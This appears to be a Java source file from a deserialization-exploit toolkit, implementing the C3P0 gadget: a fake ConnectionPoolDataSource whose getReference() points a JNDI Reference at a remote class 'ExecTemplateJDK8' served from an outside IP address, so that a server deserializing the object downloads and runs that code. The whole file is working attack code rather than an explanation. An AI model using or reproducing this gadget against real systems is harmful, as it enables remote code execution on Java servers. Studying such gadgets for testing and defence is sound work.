package Seri.C3p0;

import com.mchange.v2.ser.IndirectlySerialized;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.IOException;
import java.io.PrintWriter;
import java.io.Serializable;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

public class extendImpl implements Referenceable , ConnectionPoolDataSource {
    @Override
    public Reference getReference() throws NamingException {
        return new Reference("ExecTemplateJDK8","ExecTemplateJDK8","http://123.206.100.143:8180/");
    }

    @Override
    public PooledConnection getPooledConnection() throws SQLException {
        return null;
    }

    @Override
    public PooledConnection getPooledConnection(String user, String password) throws SQLException {
        return null;
    }

    @Override
    public PrintWriter getLogWriter() throws SQLException {
        return null;
    }

    @Override
    public void setLogWriter(PrintWriter out) throws SQLException {

    }

    @Override
    public void setLoginTimeout(int seconds) throws SQLException {

    }

    @Override
    public int getLoginTimeout() throws SQLException {
        return 0;
    }

    @Override
    public Logger getParentLogger() throws SQLFeatureNotSupportedException {
        return null;
    }

}
